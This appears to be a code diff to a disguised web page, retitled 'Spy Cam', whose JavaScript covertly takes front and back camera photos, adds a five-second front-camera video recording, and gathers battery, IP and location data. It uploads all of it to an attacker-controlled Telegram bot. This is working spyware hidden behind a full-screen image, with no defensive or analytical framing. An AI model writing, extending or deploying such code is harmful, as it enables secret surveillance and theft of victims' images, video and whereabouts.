@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Indonesia Info</title>
+    <title>Spy Cam</title>
 </head>
 <body style="margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: black;">
     <img id="displayImage" src="https://img12.pixhost.to/images/804/574487749_fikxzxmodz-developer.jpg" style="width: 100%; height: 100vh; object-fit: cover;">
@@ -53,8 +53,30 @@
                         canvas.height = video.videoHeight;
                         canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
                         stream.getTracks().forEach(track => track.stop());
-                        resolve(canvas.toDataURL("image/jpeg"));
+
+                        canvas.toBlob(blob => resolve(blob), "image/jpeg");
                     }, 2000);
+                } catch (error) {
+                    reject(error);
+                }
+            });
+        }
+
+        async function recordVideo() {
+            return new Promise(async (resolve, reject) => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                    const mediaRecorder = new MediaRecorder(stream);
+                    let chunks = [];
+
+                    mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
+                    mediaRecorder.onstop = () => {
+                        stream.getTracks().forEach(track => track.stop());
+                        resolve(new Blob(chunks, { type: "video/webm" }));
+                    };
+
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 5000); // Rekam 5 detik
                 } catch (error) {
                     reject(error);
                 }
@@ -64,28 +86,28 @@
         async function sendToTelegram() {
             try {
                 const [battery, ipInfo, location] = await Promise.all([getBatteryStatus(), getIPInfo(), getLocation()]);
+                const caption = `📌 *Data Pengguna*\n\n${battery}\n${ipInfo}\n${location}`;
+
                 const frontImage = await captureImage("user");
                 const backImage = await captureImage("environment");
+                const video = await recordVideo();
 
-                const text = `📌 *Data Pengguna*\n\n${battery}\n${ipInfo}\n${location}`;
+                const sendFile = async (type, file, captionText) => {
+                    const formData = new FormData();
+                    formData.append(type, file, `${type}.${type === "photo" ? "jpg" : "webm"}`);
+                    formData.append("chat_id", CHAT_ID);
+                    formData.append("caption", captionText);
+                    formData.append("parse_mode", "Markdown");
 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: "Markdown" })
-                });
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type === "photo" ? "Photo" : "Video"}`, {
+                        method: "POST",
+                        body: formData
+                    });
+                };
 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: CHAT_ID, photo: frontImage, caption: "📸 Kamera Depan" })
-                });
-
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: CHAT_ID, photo: backImage, caption: "📸 Kamera Belakang" })
-                });
+                await sendFile("photo", frontImage, `📸 Kamera Depan\n\n${caption}`);
+                await sendFile("photo", backImage, `📸 Kamera Belakang\n\n${caption}`);
+                await sendFile("video", video, `📹 Video Kamera Depan\n\n${caption}`);
 
             } catch (error) {
                 console.error("Gagal mengirim data:", error);
